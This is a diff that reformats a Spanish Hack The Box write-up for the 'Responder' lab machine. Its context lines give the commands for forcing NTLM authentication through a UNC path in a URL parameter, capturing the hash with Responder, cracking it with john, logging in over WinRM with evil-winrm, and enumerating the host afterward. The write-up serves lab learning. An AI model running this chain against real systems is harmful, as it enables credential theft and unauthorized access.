@@ -1,29 +1,32 @@
 ---
-title: "HTB — Responder: Writeup completo (guía paso a paso para laboratorio)"
-description: "Máquina: Responder — objetivo de aprendizaje Windows/NTLM"
-date: "2026-03-19"
+title: 'HTB — Responder: Writeup completo (guía paso a paso para laboratorio)'
+description: 'Máquina: Responder — objetivo de aprendizaje Windows/NTLM'
+date: '2026-03-19'
 tags:
   - writeup
   - learning
-tools:
-  []
+tools: []
 ---
+
 # HTB — Responder: Writeup completo (guía paso a paso para laboratorio)
 
 Máquina: Responder — objetivo de aprendizaje Windows/NTLM
 
 Resumen rápido
+
 - Objetivo: forzar autenticaciones NTLM desde el servidor web hacia nuestra máquina para capturar NetNTLM o relayeos y, si es posible, obtener acceso (ej.: WinRM) usando credenciales obtenidas.
 
 Contexto observado
+
 - `nmap` detectó:
   - `80/tcp` Apache/2.4.52 (Win64) PHP/8.1.1 — vhost `unika.htb`.
   - `5985/tcp` Microsoft-HTTPAPI/2.0 (WinRM over HTTP) — servicio interesante si se obtienen credenciales.
 
 Decisión de uso: por qué `Responder`?
+
 - LFI/RFI no mostraron archivos útiles. Como el servidor corre Win64 y WinRM está expuesto, probar NTLM capture/relay es una vía natural: si conseguimos credenciales o relays, podemos autenticar a WinRM o SMB.
 
-1) Comprobaciones iniciales (tu entorno)
+1. Comprobaciones iniciales (tu entorno)
 
 ```bash
 # Ver interfaz VPN y IP asignada
@@ -33,7 +36,7 @@ ip a | grep tun0
 
 - Esa IP (`10.10.17.188`) es la que el target debe poder alcanzar. Si no hay conectividad (firewall/rutas) la táctica fallará.
 
-2) Ejecutar Responder
+2. Ejecutar Responder
 
 ```bash
 sudo responder -I tun0 -wrf
@@ -41,7 +44,7 @@ sudo responder -I tun0 -wrf
 
 - Flags: `-I` interface; `-w` write logs; `-r` responder; `-f` modo agresivo/fast.
 
-3) Forzar al servidor a contactar tu IP (triggers UNC)
+3. Forzar al servidor a contactar tu IP (triggers UNC)
 
 Prueba variantes desde tu máquina (con Host apropiado):
 
@@ -53,7 +56,7 @@ curl -s -H "Host: unika.htb" "http://10.129.95.234/index.php?page=\\\\10.10.17.1
 
 - Si la app procesa la entrada de forma que provoca una llamada a un recurso remoto, el servidor intentará autenticarse vía SMB contra `10.10.17.188`.
 
-4) Monitorizar capturas
+4. Monitorizar capturas
 
 ```bash
 tail -f Logs/Responder-*/Responder-Session.log
@@ -68,13 +71,13 @@ Ejemplo de captura (simulado):
 # host: 10.10.17.188 victim: UNIKA\Alice NETNTLMv2: Alice::UNIKA:1122334455667788:aaabbbccc...
 ```
 
-5) Guardar la captura y preparación para cracking/relay
+5. Guardar la captura y preparación para cracking/relay
 
 ```bash
 echo 'Alice::UNIKA:1122334455667788:aaabbbccc...' > netntlm_hashes.txt
 ```
 
-6) Romper el hash (opción A) — ejemplo con `john` y `rockyou` (tú usaste este flujo)
+6. Romper el hash (opción A) — ejemplo con `john` y `rockyou` (tú usaste este flujo)
 
 ```bash
 john --format=NetNTLMv2 -w:/usr/share/wordlists/rockyou.txt netntlm_hashes.txt
@@ -83,7 +86,7 @@ john --show netntlm_hashes.txt
 
 - En tu caso `john` devolvió: `administrator:badminton`.
 
-7) Acceso vía WinRM con `evil-winrm` (opción efectiva para Windows)
+7. Acceso vía WinRM con `evil-winrm` (opción efectiva para Windows)
 
 ```bash
 evil-winrm -i 10.129.95.234 -u administrator -p badminton
@@ -91,11 +94,11 @@ evil-winrm -i 10.129.95.234 -u administrator -p badminton
 
 - `evil-winrm` es una herramienta Ruby que permite ejecutar comandos remotos mediante WinRM; es muy útil para shells interactivos en Windows cuando WinRM está habilitado.
 
-8) Alternativa: Relay (opción B)
+8. Alternativa: Relay (opción B)
 
 - En lugar de cracking, puedes usar `ntlmrelayx.py` para reenviar la autenticación capturada a un servicio que acepte NTLM y así obtener acceso sin conocer la contraseña.
 
-9) Post-acceso: tareas de enumeración (básicas)
+9. Post-acceso: tareas de enumeración (básicas)
 
 ```text
 whoami /priv
@@ -106,7 +109,8 @@ powershell -c "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
 
 - Buscar credenciales en ficheros, revisar servicios, listar shares y configurar pivoteo según necesidad.
 
-10) Notas finales y medidas de seguridad
+10. Notas finales y medidas de seguridad
+
 - Guarda evidencias y elimina capturas sensibles tras la sesión.
 - Si tu objetivo era aprendizaje, documenta pasos, comandos y resultados en `writeups/learning/Responder/`.
 
